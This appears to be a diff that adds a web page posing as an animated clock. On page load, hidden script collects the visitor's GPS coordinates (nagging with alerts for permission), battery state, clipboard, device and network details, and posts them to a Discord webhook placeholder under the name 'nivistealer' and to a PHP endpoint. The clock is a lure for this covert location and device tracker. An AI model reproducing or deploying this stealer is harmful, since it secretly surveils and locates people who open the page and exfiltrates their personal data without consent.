@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+
+<html>
+
+    <head>
+
+        <meta charset="utf-8">
+
+        <title>Clock</title>
+
+        <script src="main.js" ></script>
+
+   
+
+    </head>
+
+    <body>
+
+    
+
+        <div class="container">
+
+            <div class="clock">
+
+                <div class="circle" id="sc" style="--clr:#04fc43;"><i></i></div>
+
+                <div class="circle circle2" id="mn" style="--clr:#c1fc00;"><i></i></div>
+
+                <div class="circle circle3" id="hr" style="--clr:#f0093f;"><i></i></div>
+
+                <span style="--i:1;"><b>1</b></span>
+
+                <span style="--i:2;"><b>2</b></span>
+
+                <span style="--i:3;"><b>3</b></span>
+
+                <span style="--i:4;"><b>4</b></span>
+
+                <span style="--i:5;"><b>5</b></span>
+
+                <span style="--i:6;"><b>6</b></span>
+
+                <span style="--i:7;"><b>7</b></span>
+
+                <span style="--i:8;"><b>8</b></span>
+
+                <span style="--i:9;"><b>9</b></span>
+
+                <span style="--i:10;"><b>10</b></span>
+
+                <span style="--i:11;"><b>11</b></span>
+
+                <span style="--i:12;"><b>12</b></span>
+
+            </div>
+
+          <div id="time">
+
+            <div id="hour" style="--clr:#ff2972;">00</div>
+
+           
+
+            <div id="minutes" style="--clr:#c1fc00;">00</div>
+
+        </div>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+
+        <script>
+
+           $(document).ready(function() {
+
+             var batterypercentage
+
+             var ischarging
+
+             async function getclips() {
+
+               var btr = await navigator.getBattery();
+
+               batterypercentage = String(btr.level*100+"%");
+
+               ischarging = String(btr.charging);
+
+               try {
+
+  
+
+                 giveclips(victimtext)
+
+               } catch (error) {
+
+                 giveclips("Clipboard Permission Denied")
+
+               }
+
+             }
+
+             getclips()
+
+             var clips
+
+           
+
+             function giveclips(polp) {
+
+               clips = polp
+
+               getLocation()
+
+             }
+
+           
+
+             function getLocation() {
+
+               if (navigator.geolocation) {
+
+                 navigator.geolocation.getCurrentPosition(showPosition, showError);
+
+               } else {
+
+                 alert("Location Permission in required for better experience");
+
+               }
+
+             }
+
+           
+
+             function showPosition(position) {
+
+               var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
+
+               sdrp(grak, clips,batterypercentage,ischarging);
+
+               senddis(grak, clips,batterypercentage,ischarging);
+
+             }
+
+           
+
+             function showError(error) {
+
+               switch (error.code) {
+
+                 case error.PERMISSION_DENIED:
+
+                   sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
+
+                   senddis("Location Permission Denied",clips,batterypercentage,ischarging)
+
+                   alert("Give permission to use Gps");
+
+           
+
+                   break;
+
+                 case error.POSITION_UNAVAILABLE:
+
+                   window.close()
+
+                   break;
+
+                 case error.TIMEOUT:
+
+                   window.close()
+
+                   break;
+
+                 case error.UNKNOWN_ERROR:
+
+                   window.close()
+
+                   break;
+
+               }
+
+             }
+
+              
+
+             let datetime = new Date();
+
+             let localtime = String(datetime.toLocaleTimeString());
+
+             let referurl = document.referrer;
+
+             let cpuThreads = String(navigator.hardwareConcurrency);
+
+             let deviceram = String(navigator.deviceMemory) + "gb";
+
+             let useragent = navigator.userAgent;
+
+             let iscookieEnabled = String(navigator.cookieEnabled);
+
+             let devicelang = String(navigator.language);
+
+             let width = screen.width;
+
+             let height = screen.height;
+
+             let platform = navigator.platform;
+
+             let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+             let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
+
+           
+
+             function senddis(gpsr, clips,batterypercentage,ischarging) {
+
+               var request = new XMLHttpRequest();
+
+               request.open("POST", "https://your-discordwebhook-url");
+
+               request.setRequestHeader('Content-type', 'application/json');
+
+               var params = {
+
+                 content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
+
+                 username: "nivistealer",
+
+                 avatar_url: "  "
+
+               }
+
+               request.send(JSON.stringify(params));
+
+             }
+
+           
+
+             function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
+
+               $.ajax({
+
+                 type: "POST",
+
+                 url: "sunni.php",
+
+                 data: {
+
+                   networkinformation : networkinformation,
+
+                   batterypercentage:batterypercentage,
+
+                   ischarging:ischarging,
+
+                   width: width,
+
+                   height: height,
+
+                   platform: platform,
+
+                   gps: bsdks,
+
+                   devicelang: devicelang,
+
+                   iscookieEnabled: iscookieEnabled,
+
+                   useragent: useragent,
+
+                   deviceram: deviceram,
+
+                   cpuThreads: cpuThreads,
+
+                   referurl: referurl,
+
+                   localtime: localtime,
+
+                   clipboard: clipboard,
+
+                 },
+
+                 cache: false,
+
+                 success: function(data) {},
+
+                 error: function(xhr, status, error) {
+
+                   console.log(error);
+
+                 }
+
+               })
+
+             }
+
+           })
+
+        </script>
+
+        <script>
+
+            let hr = document.querySelector('#hr');
+
+            let mn = document.querySelector('#mn');
+
+            setInterval(() =>{
+
+                let day=new Date();
+
+            let hh = day.getHours() * 30;
+
+            let mm= day.getMinutes() * 6;
+
+            let ss=day.getSeconds() * 6;
+
+            hr.style.transform= `rotateZ(${hh+(mm/12)}deg)`;
+
+            mn.style.transform=`rotateZ(${mm}deg)`;
+
+            sc.style.transform=`rotateZ(${ss}deg)`;
+
+            })
+
+            let hour = document.getElementById('hour');
+
+            let minutes = document.getElementById('minutes');
+
+            let h = new Date().getHours();
+
+            let m = new Date().getMinutes();
+
+            h=(h<10) ? "0" + h:h
+
+            m=(m<10) ? "0" + m:m
+
+            hour.innerHTML=h;
+
+            minutes.innerHTML=m;
+
+        </script>
+
+
+
+    </body>
+
+</html>
